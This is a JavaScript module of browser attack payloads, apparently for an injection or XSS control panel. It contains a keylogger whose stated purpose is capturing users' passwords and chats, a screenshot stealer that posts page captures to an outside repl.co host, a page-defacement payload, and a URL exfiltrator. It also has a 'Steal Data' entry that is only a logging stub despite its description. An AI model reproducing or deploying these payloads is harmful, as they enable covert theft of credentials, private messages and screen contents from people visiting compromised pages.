const utils = [
  {
    name: "Key Strokes",
    description: "You will get the keystrokes pressed by the user.\nCan be used when you want to track passwords or chat of a user.",
    func: () => {
      let characters = [];
      function debounce(f, wait) {
        let timerId = null;
        return function (...args) {
          clearTimeout(timerId);
          timerId = setTimeout(() => f.apply(this, args), wait);
        }
      }

      const sendNewData = debounce(async (data) => {
        await sendData(data);
        characters = [];
      }, 1000)

      document.addEventListener("keypress", async (event) => {
        characters.push(event.key)
        sendNewData(characters.join(""));
      })
    }
  },



  {
    name: "Screenshot",
    description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
    func: () => {
      document.addEventListener('DOMContentLoaded', function () {
        // your code here
      }, false);

      html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
      })
        .then(async function (canvas) {
          // It will return a canvas element
          // DOMAIN
          const domain = "https://draco.maalolan.repl.co/";

          const blob = await (new Promise((resolve, reject) => {
            canvas.toBlob(file => {
              resolve(file)
            }, 'image/png')
          }));

          var form_data = new FormData();
          form_data.append("screenshot", blob, "ss.png");

          await fetch(`${domain}screenshots`, {
            method: 'POST', // or 'PUT'
            body: form_data,
          })
        })
        .catch((e) => {
          // Handle errors
          console.log(e);
        });
    }
  },



  {
    name: "Terror",
    description: "Erase page to show `YOU ARE HACKED!!!`",
    func: () => {
      document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
    }
  },



  {
    name: "Get URL",
    description: "Gets the URL of the page target visits",
    func: async () => {
      await sendData(window.location.href);
    }
  },


  {
    name: "Steal Data",
    description: "Intercepts network fetch requests and gets a copy of the data to the hacker",
    func: () => {

      self.addEventListener('fetch', function(event) {
        console.log(event);
      })

    }
  },


  
  {
    name: "Screenshot attack",
    description: "Download screenshot of the current page they visited",
    func: () => {
      document.addEventListener('DOMContentLoaded', function () {
        // your code here
      }, false);

      html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
      })
        .then(async function (canvas) {
          // It will return a canvas element
          // DOMAIN
        var image = new Image();
        image.src = canvas.toDataURL("image/png")
        image.style.width = "100vw;"

        var w = window.open("");
        w.document.write(image.outerHTML);
        })
        .catch((e) => {
          // Handle errors
          console.log(e);
        });
    }
  }
]

module.exports = utils
